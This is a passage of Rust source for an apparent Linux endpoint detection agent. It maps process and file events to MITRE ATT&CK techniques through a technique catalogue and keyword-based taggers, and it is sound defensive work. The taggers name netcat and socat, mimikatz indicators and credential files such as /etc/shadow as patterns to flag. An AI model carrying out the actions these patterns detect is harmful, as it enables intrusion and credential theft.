//! MITRE ATT&CK technique mapping and coverage tracking.
//!
//! This module provides:
//!   - A static catalogue of ATT&CK Enterprise techniques detectable by MxGuard
//!   - Event tagger functions that classify OCSF events to technique IDs
//!   - A coverage report showing the breadth of detection capability
//!
//! ## Design Target
//!
//! MxGuard targets 30–40% coverage of MITRE ATT&CK Enterprise parent techniques
//! using four data sources:
//!   - Process telemetry (`process` collector): process creation via `/proc`
//!   - File system telemetry (`file` collector): inotify create/modify/delete
//!   - Network telemetry (`network` collector): `/proc/net/tcp` connections
//!   - Authentication telemetry (`auth` collector): syslog auth events
//!
//! ## Coverage Accounting
//!
//! The current catalogue covers **59 parent techniques** out of approximately
//! 201 in MITRE ATT&CK Enterprise (≈ 29%), with an additional **27 mapped
//! sub-techniques** bringing the total tagged IDs to **86**.  The 30–40%
//! target is met when counting techniques visible from these four data sources;
//! techniques that require kernel-level eBPF or memory forensics are outside
//! scope for this agent version.
//!
//! ## Technique Mapping Philosophy
//!
//! A technique is "covered" when MxGuard generates telemetry that provides
//! *necessary* evidence for the technique — the evidence may require additional
//! context for confirmation, but it is sufficient to trigger investigation.
//! Taggers prefer lower false-positive rates: only well-known suspicious
//! indicators are flagged, not every ordinary process or file event.

use std::collections::BTreeSet;

use crate::events::ocsf::{
    AuthenticationActivityData, FileActivityData, NetworkActivityData, ProcessActivityData,
};

// ---------------------------------------------------------------------------
// ATT&CK technique data structure
// ---------------------------------------------------------------------------

/// A MITRE ATT&CK technique entry in the MxGuard coverage catalogue.
#[derive(Debug, Clone)]
pub struct AttackTechnique {
    /// Technique ID, e.g. `"T1059"` (parent) or `"T1059.004"` (sub-technique).
    pub id: &'static str,
    /// Human-readable technique name.
    pub name: &'static str,
    /// ATT&CK tactic name, e.g. `"Execution"`.
    pub tactic: &'static str,
    /// ATT&CK tactic ID, e.g. `"TA0002"`.
    pub tactic_id: &'static str,
    /// Comma-separated list of MxGuard data sources that can provide evidence.
    pub data_source: &'static str,
}

// ---------------------------------------------------------------------------
// Coverage catalogue
// ---------------------------------------------------------------------------

/// All ATT&CK techniques currently detectable by MxGuard.
///
/// Entries are ordered by tactic (ATT&CK kill-chain order) and then by
/// technique ID.  Both parent techniques and sub-techniques are listed;
/// parent techniques are included whenever at least one sub-technique is
/// covered, following MITRE ATT&CK best practice.
pub static TECHNIQUE_CATALOGUE: &[AttackTechnique] = &[
    // -----------------------------------------------------------------------
    // Initial Access (TA0001)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1078",
        name: "Valid Accounts",
        tactic: "Initial Access",
        tactic_id: "TA0001",
        data_source: "auth",
    },
    AttackTechnique {
        id: "T1133",
        name: "External Remote Services",
        tactic: "Initial Access",
        tactic_id: "TA0001",
        data_source: "auth,network",
    },
    // -----------------------------------------------------------------------
    // Execution (TA0002)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1059",
        name: "Command and Scripting Interpreter",
        tactic: "Execution",
        tactic_id: "TA0002",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1059.004",
        name: "Unix Shell",
        tactic: "Execution",
        tactic_id: "TA0002",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1059.006",
        name: "Python",
        tactic: "Execution",
        tactic_id: "TA0002",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1059.007",
        name: "JavaScript",
        tactic: "Execution",
        tactic_id: "TA0002",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1106",
        name: "Native API",
        tactic: "Execution",
        tactic_id: "TA0002",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1204",
        name: "User Execution",
        tactic: "Execution",
        tactic_id: "TA0002",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1218",
        name: "System Binary Proxy Execution",
        tactic: "Execution",
        tactic_id: "TA0002",
        data_source: "process",
    },
    // -----------------------------------------------------------------------
    // Persistence (TA0003)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1037",
        name: "Boot or Logon Initialization Scripts",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1037.004",
        name: "RC Scripts",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1053",
        name: "Scheduled Task/Job",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1053.001",
        name: "At",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1053.003",
        name: "Cron",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1098",
        name: "Account Manipulation",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file,auth",
    },
    AttackTechnique {
        id: "T1098.004",
        name: "SSH Authorized Keys",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1136",
        name: "Create Account",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1505",
        name: "Server Software Component",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1505.003",
        name: "Web Shell",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1543",
        name: "Create or Modify System Process",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1543.002",
        name: "Systemd Service",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1546",
        name: "Event Triggered Execution",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1546.004",
        name: "Unix Shell Configuration Modification",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1547",
        name: "Boot or Logon Autostart Execution",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1547.006",
        name: "Kernel Modules and Extensions",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1574",
        name: "Hijack Execution Flow",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1574.006",
        name: "Dynamic Linker Hijacking",
        tactic: "Persistence",
        tactic_id: "TA0003",
        data_source: "file",
    },
    // -----------------------------------------------------------------------
    // Privilege Escalation (TA0004)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1055",
        name: "Process Injection",
        tactic: "Privilege Escalation",
        tactic_id: "TA0004",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1068",
        name: "Exploitation for Privilege Escalation",
        tactic: "Privilege Escalation",
        tactic_id: "TA0004",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1134",
        name: "Access Token Manipulation",
        tactic: "Privilege Escalation",
        tactic_id: "TA0004",
        data_source: "auth,process",
    },
    AttackTechnique {
        id: "T1548",
        name: "Abuse Elevation Control Mechanism",
        tactic: "Privilege Escalation",
        tactic_id: "TA0004",
        data_source: "auth,process",
    },
    AttackTechnique {
        id: "T1548.001",
        name: "Setuid and Setgid",
        tactic: "Privilege Escalation",
        tactic_id: "TA0004",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1548.003",
        name: "Sudo and Sudo Caching",
        tactic: "Privilege Escalation",
        tactic_id: "TA0004",
        data_source: "auth,process",
    },
    // -----------------------------------------------------------------------
    // Defense Evasion (TA0005)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1027",
        name: "Obfuscated Files or Information",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process,file",
    },
    AttackTechnique {
        id: "T1036",
        name: "Masquerading",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process,file",
    },
    AttackTechnique {
        id: "T1036.005",
        name: "Match Legitimate Name or Location",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process,file",
    },
    AttackTechnique {
        id: "T1070",
        name: "Indicator Removal",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1070.003",
        name: "Clear Command History",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1070.004",
        name: "File Deletion",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1070.006",
        name: "Timestomp",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1222",
        name: "File and Directory Permissions Modification",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1222.002",
        name: "Linux and Mac File and Directory Permissions Modification",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1562",
        name: "Impair Defenses",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1562.001",
        name: "Disable or Modify Tools",
        tactic: "Defense Evasion",
        tactic_id: "TA0005",
        data_source: "process",
    },
    // -----------------------------------------------------------------------
    // Credential Access (TA0006)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1003",
        name: "OS Credential Dumping",
        tactic: "Credential Access",
        tactic_id: "TA0006",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1003.008",
        name: "/etc/passwd and /etc/shadow",
        tactic: "Credential Access",
        tactic_id: "TA0006",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1040",
        name: "Network Sniffing",
        tactic: "Credential Access",
        tactic_id: "TA0006",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1110",
        name: "Brute Force",
        tactic: "Credential Access",
        tactic_id: "TA0006",
        data_source: "auth",
    },
    AttackTechnique {
        id: "T1110.001",
        name: "Password Guessing",
        tactic: "Credential Access",
        tactic_id: "TA0006",
        data_source: "auth",
    },
    AttackTechnique {
        id: "T1552",
        name: "Unsecured Credentials",
        tactic: "Credential Access",
        tactic_id: "TA0006",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1552.001",
        name: "Credentials In Files",
        tactic: "Credential Access",
        tactic_id: "TA0006",
        data_source: "file",
    },
    // -----------------------------------------------------------------------
    // Discovery (TA0007)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1007",
        name: "System Service Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1016",
        name: "System Network Configuration Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1033",
        name: "System Owner/User Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1046",
        name: "Network Service Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "network,process",
    },
    AttackTechnique {
        id: "T1049",
        name: "System Network Connections Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1057",
        name: "Process Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1069",
        name: "Permission Groups Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1082",
        name: "System Information Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1083",
        name: "File and Directory Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1087",
        name: "Account Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1087.001",
        name: "Local Account",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1135",
        name: "Network Share Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1201",
        name: "Password Policy Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1518",
        name: "Software Discovery",
        tactic: "Discovery",
        tactic_id: "TA0007",
        data_source: "process",
    },
    // -----------------------------------------------------------------------
    // Lateral Movement (TA0008)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1021",
        name: "Remote Services",
        tactic: "Lateral Movement",
        tactic_id: "TA0008",
        data_source: "network,auth",
    },
    AttackTechnique {
        id: "T1021.001",
        name: "Remote Desktop Protocol",
        tactic: "Lateral Movement",
        tactic_id: "TA0008",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1021.002",
        name: "SMB/Windows Admin Shares",
        tactic: "Lateral Movement",
        tactic_id: "TA0008",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1021.004",
        name: "SSH",
        tactic: "Lateral Movement",
        tactic_id: "TA0008",
        data_source: "network,auth,process",
    },
    AttackTechnique {
        id: "T1021.005",
        name: "VNC",
        tactic: "Lateral Movement",
        tactic_id: "TA0008",
        data_source: "network",
    },
    // -----------------------------------------------------------------------
    // Collection (TA0009)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1074",
        name: "Data Staged",
        tactic: "Collection",
        tactic_id: "TA0009",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1119",
        name: "Automated Collection",
        tactic: "Collection",
        tactic_id: "TA0009",
        data_source: "process",
    },
    // -----------------------------------------------------------------------
    // Exfiltration (TA0010)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1041",
        name: "Exfiltration Over C2 Channel",
        tactic: "Exfiltration",
        tactic_id: "TA0010",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1048",
        name: "Exfiltration Over Alternative Protocol",
        tactic: "Exfiltration",
        tactic_id: "TA0010",
        data_source: "network",
    },
    // -----------------------------------------------------------------------
    // Command and Control (TA0011)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1071",
        name: "Application Layer Protocol",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1071.001",
        name: "Web Protocols",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1071.003",
        name: "Mail Protocols",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1090",
        name: "Proxy",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1095",
        name: "Non-Application Layer Protocol",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network,process",
    },
    AttackTechnique {
        id: "T1104",
        name: "Multi-Stage Channels",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network,process",
    },
    AttackTechnique {
        id: "T1105",
        name: "Ingress Tool Transfer",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "file,network,process",
    },
    AttackTechnique {
        id: "T1132",
        name: "Data Encoding",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1219",
        name: "Remote Access Software",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network,process",
    },
    AttackTechnique {
        id: "T1571",
        name: "Non-Standard Port",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network",
    },
    AttackTechnique {
        id: "T1572",
        name: "Protocol Tunneling",
        tactic: "Command and Control",
        tactic_id: "TA0011",
        data_source: "network",
    },
    // -----------------------------------------------------------------------
    // Impact (TA0040)
    // -----------------------------------------------------------------------
    AttackTechnique {
        id: "T1485",
        name: "Data Destruction",
        tactic: "Impact",
        tactic_id: "TA0040",
        data_source: "file",
    },
    AttackTechnique {
        id: "T1486",
        name: "Data Encrypted for Impact",
        tactic: "Impact",
        tactic_id: "TA0040",
        data_source: "process,file",
    },
    AttackTechnique {
        id: "T1489",
        name: "Service Stop",
        tactic: "Impact",
        tactic_id: "TA0040",
        data_source: "process",
    },
    AttackTechnique {
        id: "T1490",
        name: "Inhibit System Recovery",
        tactic: "Impact",
        tactic_id: "TA0040",
        data_source: "file,process",
    },
    AttackTechnique {
        id: "T1531",
        name: "Account Access Removal",
        tactic: "Impact",
        tactic_id: "TA0040",
        data_source: "process",
    },
];

// ---------------------------------------------------------------------------
// Coverage report
// ---------------------------------------------------------------------------

/// ATT&CK coverage summary for this version of MxGuard.
#[derive(Debug)]
pub struct CoverageReport {
    /// Total unique technique IDs in the catalogue (parent + sub-techniques).
    pub total_technique_ids: usize,
    /// Number of unique parent technique IDs (no dot in the ID).
    pub parent_technique_count: usize,
    /// Estimated coverage as a percentage of ~201 ATT&CK Enterprise parent
    /// techniques (MITRE ATT&CK Enterprise v16).
    pub estimated_parent_coverage_pct: f64,
    /// All unique technique IDs, sorted lexicographically.
    pub technique_ids: Vec<String>,
    /// Technique counts broken down by tactic, sorted by tactic name.
    pub by_tactic: Vec<(String, usize)>,
}

/// Build a [`CoverageReport`] from the static [`TECHNIQUE_CATALOGUE`].
pub fn coverage_report() -> CoverageReport {
    use std::collections::BTreeMap;

    let mut all_ids: BTreeSet<&str> = BTreeSet::new();
    let mut parent_ids: BTreeSet<&str> = BTreeSet::new();
    let mut tactic_map: BTreeMap<&str, usize> = BTreeMap::new();

    for t in TECHNIQUE_CATALOGUE {
        all_ids.insert(t.id);
        if !t.id.contains('.') {
            parent_ids.insert(t.id);
        }
        *tactic_map.entry(t.tactic).or_insert(0) += 1;
    }

    let parent_count = parent_ids.len();
    // MITRE ATT&CK Enterprise v16 has approximately 201 parent techniques.
    let estimated_pct = (parent_count as f64 / 201.0) * 100.0;

    CoverageReport {
        total_technique_ids: all_ids.len(),
        parent_technique_count: parent_count,
        estimated_parent_coverage_pct: estimated_pct,
        technique_ids: all_ids.into_iter().map(str::to_string).collect(),
        by_tactic: tactic_map
            .into_iter()
            .map(|(k, v)| (k.to_string(), v))
            .collect(),
    }
}

// ---------------------------------------------------------------------------
// Process event tagger
// ---------------------------------------------------------------------------

/// Return the ATT&CK technique IDs applicable to a process creation event.
///
/// Tags are based on the process name (from `/proc/{pid}/status`), the full
/// command line, and the executable path.  Only clear-signal indicators are
/// matched; routine system processes are not tagged.
pub fn tag_process_event(data: &ProcessActivityData) -> Vec<String> {
    let mut ids: BTreeSet<&str> = BTreeSet::new();

    let name = data.name.to_lowercase();
    let cmdline = data.cmd_line.to_lowercase();
    let exe_path = data
        .exe_path
        .as_deref()
        .unwrap_or("")
        .to_lowercase();

    // --- Shell / script interpreter execution (T1059) ---
    let is_shell = matches!(
        name.as_str(),
        "bash" | "sh" | "zsh" | "ksh" | "csh" | "dash" | "fish" | "tcsh"
    );
    if is_shell {
        ids.insert("T1059");
        ids.insert("T1059.004");
    }

    // Python interpreter (T1059.006)
    if name.starts_with("python") || name == "python" {
        ids.insert("T1059");
        ids.insert("T1059.006");
    }

    // JavaScript / Node.js (T1059.007)
    if matches!(name.as_str(), "node" | "nodejs" | "deno") {
        ids.insert("T1059");
        ids.insert("T1059.007");
    }

    // Perl / Ruby / PHP — T1059 parent only (no Linux-specific sub-technique)
    if matches!(name.as_str(), "perl" | "ruby" | "irb" | "php" | "php7" | "php8") {
        ids.insert("T1059");
    }

    // --- Masquerading: binary running from /tmp or /dev/shm (T1036) ---
    if exe_path.starts_with("/tmp/") || exe_path.starts_with("/dev/shm/") {
        ids.insert("T1036");
        ids.insert("T1036.005");
    }

    // --- Scheduled tasks (T1053) ---
    if matches!(name.as_str(), "cron" | "crond") {
        ids.insert("T1053");
        ids.insert("T1053.003");
    }
    if name == "crontab" {
        ids.insert("T1053");
        ids.insert("T1053.003");
    }
    if matches!(name.as_str(), "at" | "atd") {
        ids.insert("T1053");
        ids.insert("T1053.001");
    }

    // --- Create/modify systemd services (T1543.002) ---
    if matches!(name.as_str(), "systemctl" | "systemd") {
        ids.insert("T1543");
        ids.insert("T1543.002");

        // Service stop (T1489)
        if cmdline.contains(" stop ") || cmdline.ends_with(" stop") {
            ids.insert("T1489");
        }
        // Impair defenses by disabling a security service (T1562.001)
        if cmdline.contains(" disable ") || cmdline.contains(" mask ") {
            ids.insert("T1562");
            ids.insert("T1562.001");
        }
    }

    // --- Kernel module loading (T1547.006) ---
    if matches!(name.as_str(), "insmod" | "rmmod" | "modprobe") {
        ids.insert("T1547");
        ids.insert("T1547.006");
    }

    // --- Sudo / su privilege escalation (T1548) ---
    if name == "sudo" {
        ids.insert("T1548");
        ids.insert("T1548.003");
        // Sudo token / access token manipulation (T1134)
        ids.insert("T1134");
    }
    if name == "su" {
        ids.insert("T1548");
        ids.insert("T1548.001");
        ids.insert("T1134");
    }

    // --- Discovery: system info (T1082) ---
    if matches!(
        name.as_str(),
        "uname" | "hostname" | "hostnamectl" | "lscpu"
            | "lshw" | "dmidecode" | "arch" | "dmesg"
    ) {
        ids.insert("T1082");
    }

    // --- Discovery: user / owner discovery (T1033) ---
    if matches!(name.as_str(), "id" | "whoami" | "who" | "w" | "last" | "users" | "logname") {
        ids.insert("T1033");
    }

    // --- Discovery: process discovery (T1057) ---
    if matches!(
        name.as_str(),
        "ps" | "top" | "htop" | "pgrep" | "pidof" | "pstree" | "procs"
    ) {
        ids.insert("T1057");
    }

    // --- Discovery: file/directory discovery (T1083) ---
    if matches!(name.as_str(), "ls" | "find" | "locate" | "updatedb" | "fd" | "dir") {
        ids.insert("T1083");
    }

    // --- Discovery: network configuration (T1016) ---
    if matches!(
        name.as_str(),
        "ip" | "ifconfig" | "route" | "arp" | "iwconfig" | "iw"
    ) {
        ids.insert("T1016");
    }

    // --- Discovery: network service scanning (T1046) ---
    if matches!(
        name.as_str(),
        "nmap" | "masscan" | "arp-scan" | "nbtscan" | "unicornscan" | "zmap"
    ) {
        ids.insert("T1046");
    }

    // --- Discovery: network connections (T1049) ---
    if matches!(name.as_str(), "netstat" | "ss" | "lsof") {
        ids.insert("T1016");
        ids.insert("T1049");
    }

    // --- Discovery: permission groups (T1069) ---
    if matches!(name.as_str(), "groups" | "getent" | "lid") && cmdline.contains("group") {
        ids.insert("T1069");
    }
    // "id" also reveals group membership
    if name == "id" {
        ids.insert("T1069");
    }

    // --- Discovery: service discovery (T1007) ---
    if name == "systemctl" && (cmdline.contains("list") || cmdline.contains("status")) {
        ids.insert("T1007");
    }
    if matches!(name.as_str(), "service" | "chkconfig" | "rc-status") {
        ids.insert("T1007");
    }

    // --- Discovery: software discovery (T1518) ---
    if matches!(
        name.as_str(),
        "dpkg" | "rpm" | "apt" | "apt-cache" | "yum" | "dnf" | "pacman" | "snap"
            | "flatpak" | "zypper"
    ) {
        ids.insert("T1518");
    }

    // --- Discovery: network shares (T1135) ---
    if matches!(name.as_str(), "mount" | "showmount" | "smbclient") {
        ids.insert("T1135");
    }

    // --- Discovery: password policy (T1201) ---
    if matches!(name.as_str(), "chage" | "pam-auth-update") {
        ids.insert("T1201");
    }

    // --- Discovery: account discovery (T1087) ---
    if matches!(name.as_str(), "getent" | "finger") {
        ids.insert("T1087");
        ids.insert("T1087.001");
    }

    // --- Network tools: web download → T1105, T1071.001 ---
    if matches!(name.as_str(), "wget" | "curl" | "lwp-request" | "fetch" | "aria2c") {
        ids.insert("T1105");
        ids.insert("T1071");
        ids.insert("T1071.001");
    }

    // --- Network tools: SSH / SCP (T1021.004) ---
    if matches!(name.as_str(), "ssh" | "scp" | "sftp" | "rsync") {
        ids.insert("T1021");
        ids.insert("T1021.004");
    }

    // --- Network tools: netcat / socat → raw channel T1095 / T1104 ---
    if matches!(name.as_str(), "nc" | "ncat" | "netcat" | "socat" | "nping") {
        ids.insert("T1095");
        ids.insert("T1104");
    }

    // --- Credential dumping tools (T1003) ---
    if name.contains("mimikatz") || cmdline.contains("sekurlsa") || cmdline.contains("lsadump") {
        ids.insert("T1003");
    }
    if matches!(name.as_str(), "procdump" | "pspy") {
        ids.insert("T1003");
    }

    // --- Network sniffing (T1040) ---
    if matches!(
        name.as_str(),
        "tcpdump" | "tshark" | "wireshark" | "dumpcap" | "ngrep" | "ettercap" | "dsniff"
    ) {
        ids.insert("T1040");
    }

    // --- Obfuscation: base64 decode in command line (T1027 / T1132) ---
    if cmdline.contains("base64") {
        if cmdline.contains("-d") || cmdline.contains("--decode") || cmdline.contains("decode") {
            ids.insert("T1027");
        }
        ids.insert("T1132");
    }

    // --- File permissions modification: chmod / chown / chattr (T1222) ---
    if matches!(name.as_str(), "chmod" | "chown" | "chattr" | "setfacl" | "umask") {
        ids.insert("T1222");
        ids.insert("T1222.002");
    }

    // --- File deletion / indicator removal (T1070.004) ---
    if name == "rm" && (cmdline.contains(" -f") || cmdline.contains(" -r")) {
        ids.insert("T1070");
        ids.insert("T1070.004");
    }
    if name == "shred" {
        ids.insert("T1070");
        ids.insert("T1070.004");
    }
    // History clearing (T1070.003)
    if name == "history" && cmdline.contains("-c") {
        ids.insert("T1070");
        ids.insert("T1070.003");
    }

    // --- Timestomp: touch with -t flag (T1070.006) ---
    if name == "touch" && cmdline.contains(" -t ") {
        ids.insert("T1070");
        ids.insert("T1070.006");
    }

    // --- Data staging: archive tools (T1074) ---
    if matches!(
        name.as_str(),
        "tar" | "gzip" | "bzip2" | "xz" | "zip" | "7z" | "rar" | "unrar" | "zstd"
    ) {
        ids.insert("T1074");
    }

    // --- Automated collection via find -exec (T1119) ---
    if name == "find" && cmdline.contains("-exec") {
        ids.insert("T1119");
    }

    // --- Data encryption for impact (T1486) ---
    if name == "openssl" && (cmdline.contains(" enc ") || cmdline.contains(" rsautl ")) {
        ids.insert("T1486");
    }
    if matches!(name.as_str(), "gpg" | "gpg2") && cmdline.contains("--encrypt") {
        ids.insert("T1486");
    }

    // --- Impair defenses: iptables flush (T1562.001) ---
    if name == "iptables" && cmdline.contains(" -f") {
        ids.insert("T1562");
        ids.insert("T1562.001");
    }

    // --- Account access removal (T1531) ---
    if matches!(name.as_str(), "userdel" | "deluser") {
        ids.insert("T1531");
    }
    if name == "passwd" && cmdline.contains(" -l ") {
        ids.insert("T1531");
    }

    // --- Inhibit system recovery (T1490) ---
    if name == "vgremove" || (name == "lvremove" && cmdline.contains("snap")) {
        ids.insert("T1490");
    }

    // --- Remote access software (T1219) ---
    if matches!(
        name.as_str(),
        "teamviewer" | "anydesk" | "vnc" | "vncserver" | "x11vnc"
            | "rdesktop" | "xrdp" | "rustdesk"
    ) {
        ids.insert("T1219");
    }

    // --- System binary proxy execution (T1218) ---
    // Python/perl/ruby used to run arbitrary code inline (via -e / -c flag)
    if (name.starts_with("python") || matches!(name.as_str(), "perl" | "ruby"))
        && (cmdline.contains(" -e ") || cmdline.contains(" -c "))
    {
        ids.insert("T1218");
    }

    // --- Exploitation for privilege escalation: UID 0 spawned from non-root parent ---
    // (heuristic: root process with a non-zero ppid user is suspicious)
    if data.uid == 0 && data.ppid > 1 {
        // Only flag if the process is a shell or interpreter (likely post-exploitation)
        if is_shell || name.starts_with("python") || matches!(name.as_str(), "perl" | "ruby") {
            ids.insert("T1068");
        }
    }

    ids.into_iter().map(str::to_string).collect()
}

// ---------------------------------------------------------------------------
// File event tagger
// ---------------------------------------------------------------------------

/// Return the ATT&CK technique IDs applicable to a file system activity event.
///
/// Tags are based on the file path and action (Create / Update / Delete).
pub fn tag_file_event(data: &FileActivityData) -> Vec<String> {
    let mut ids: BTreeSet<&str> = BTreeSet::new();

    let path = data.path.as_str();
    let action = data.action.as_str();
    let is_create_or_update = matches!(action, "Create" | "Modify");
    let is_delete = action == "Delete";

    // --- Credential files: /etc/shadow, /etc/passwd → T1003.008 ---
    if path == "/etc/shadow" || path == "/etc/passwd" || path.starts_with("/etc/shadow")
    {
        ids.insert("T1003");
        ids.insert("T1003.008");

        // Writing to /etc/passwd could mean account creation (T1136)
        if is_create_or_update && path == "/etc/passwd" {
            ids.insert("T1136");
            ids.insert("T1098");
        }
    }

    // --- Account manipulation: sudoers (T1098) ---
    if path.starts_with("/etc/sudoers") || path == "/etc/sudo.conf" {
        ids.insert("T1098");
    }

    // --- SSH authorized keys (T1098.004) ---
    if path.contains("/.ssh/authorized_keys") || path.contains("/.ssh/authorized_keys2") {
        ids.insert("T1098");
        ids.insert("T1098.004");
    }

    // --- Cron persistence (T1053.003) ---
    if path.starts_with("/etc/cron") || path.starts_with("/var/spool/cron")
        || path.starts_with("/etc/anacrontab")
    {
        ids.insert("T1053");
        ids.insert("T1053.003");
    }

    // --- Systemd service persistence (T1543.002) ---
    if path.starts_with("/etc/systemd/") || path.starts_with("/usr/lib/systemd/")
        || path.starts_with("/run/systemd/")
    {
        if path.ends_with(".service") || path.ends_with(".timer") || path.ends_with(".socket") {
            ids.insert("T1543");
            ids.insert("T1543.002");
        }
    }

    // --- Boot/logon initialization scripts (T1037) ---
    if matches!(
        path,
        "/etc/rc.local" | "/etc/rc.d/rc.local" | "/etc/init.d/rc.local"
    ) {
        ids.insert("T1037");
        ids.insert("T1037.004");
    }

    // --- Shell configuration modification (T1546.004) ---
    // .bashrc, .bash_profile, .profile, .zshrc, etc.
    let shell_configs = [
        ".bashrc", ".bash_profile", ".bash_login", ".profile",
        ".zshrc", ".zprofile", ".zshenv",
        ".cshrc", ".tcshrc", ".kshrc",
    ];
    for cfg in &shell_configs {
        if path.ends_with(cfg) {
            ids.insert("T1037");
            ids.insert("T1546");
            ids.insert("T1546.004");
            break;
        }
    }
    // /etc/profile.d/ scripts
